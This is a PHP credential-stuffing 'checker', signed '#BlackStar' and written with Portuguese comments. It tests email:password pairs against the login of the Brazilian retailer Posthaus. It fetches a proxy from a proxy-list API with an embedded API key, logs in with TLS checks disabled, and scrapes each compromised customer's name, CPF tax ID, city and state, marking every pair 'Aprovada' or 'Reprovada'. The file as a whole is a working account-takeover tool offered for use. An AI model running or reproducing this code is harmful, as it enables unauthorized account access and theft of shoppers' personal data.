<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados

        $link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
        $link2 = json_decode($link);
        $link3 = $link2 ->ip;
        $link4 = $link2 ->port;
        $proxy = $link3.":".$link4;

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.posthaus.com.br/cliente/login?navegue=&loja=0&anc=0&marc=0");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.posthaus.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://www.posthaus.com.br/cliente/login',
        'Connection: keep-alive'
    ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'mnMinhaConta=null&opcao-cliente=on&dsEmai='.$email.'&senCli='.$senha.'&acao=Login&exec=autenticar&navegue=&loja=0&accesstokenFB=&FROM=');   
        $result = curl_exec($ch);

        curl_setopt($ch, CURLOPT_URL, "https://www.posthaus.com.br/cliente/cadastro/alteracao?acao=historicopd&navegue=meusDados");
        curl_setopt($ch, CURLOPT_POST, 0);
        $result2 = curl_exec($ch);

        curl_setopt($ch, CURLOPT_URL, "https://www.posthaus.com.br/cliente/endereco/alterar?acao=listarEnderecos&cdende=0&navegue=formularioEndereco");
        curl_setopt($ch, CURLOPT_POST, 0);
        $result3 = curl_exec($ch);

        $nome = dados($result2, 'name="nomcli" id="nomcli" readonly="readonly" value=','/', 1);
        $cpf = dados($result2, 'readonly="readonly" value="','"', 1);
        $cid = dados($result3, 'name="Cidade" id="Cidade" placeholder="Cidade" class="readonly" value=',' type="text"', 1);
        $est = dados($result3, 'name="UF" id="UF" placeholder="Estado" class="readonly" value=',' type="text"', 1);


        if (strpos($result, 'Aviso!') !== false) {

            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | NOME: $nome | CPF: $cpf | Cidade: $cid | Estado: $est | <font style='color: MidnightBlue;'>#BlackStar©</font></b>";
        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>#BlackStar©</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>